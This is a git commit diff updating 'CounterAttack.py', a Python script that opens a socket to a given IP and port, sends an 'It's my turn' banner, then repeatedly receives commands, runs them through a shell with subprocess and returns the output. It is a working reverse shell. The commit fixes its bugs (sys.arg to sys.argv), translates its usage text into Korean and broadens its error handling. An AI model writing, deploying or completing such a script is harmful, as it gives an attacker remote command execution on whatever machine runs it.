987714278bbaf66e329d94445ac5b2155c4e8f87
Minseo Kim <128388376+neck392@users.noreply.github.com>
2024-06-22 01:24:51 +0900

    Update CounterAttack.py

--- CounterAttack.py
+++ CounterAttack.py
@@ -4,25 +4,23 @@ import sys
 import subprocess
 
 def usage():
-    print('How To Use: CounterAttack.py <ip> <port>')
-    exit()
+    print('사용법: CounterAttack.py <ip> <port>')
+    sys.exit()
 
-if len(sys.arg) < 3:
-    usage()  
+if len(sys.argv) < 3:
+    usage()
 
 s = socket.socket()
-ip = sys.arg[1]
-port = int(sys.arg[2])
+ip = sys.argv[1]
+port = int(sys.argv[2])
 
 try:
     s.connect((ip, port))
     s.send(
-        b'''
-        -----------------------------------
-        -- Network connection successful --
-        ----       It's my turn        ----
-        -----------------------------------
-        '''
+        b'-----------------------------------\n'
+        b'-- Network connection successful --\n'
+        b'----       It\'s my turn        ----\n'
+        b'-----------------------------------\n'
     )
 
     while True:
@@ -33,12 +31,11 @@ try:
 
         # 명령 실행
         try:
-            if os.name == 'nt':
-                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-            else:
-                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e: # 파이썬 버전이 3.7보다 낮을 경우 직접 텍스트 변환 후 다시 전송
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+        except subprocess.CalledProcessError as e:  # 파이썬 버전이 3.7보다 낮을 경우
             output = e.output.decode() if isinstance(e.output, bytes) else str(e.output)
+        except Exception as e:
+            output = str(e)
 
         # 결과 전송
         s.send(output.encode())
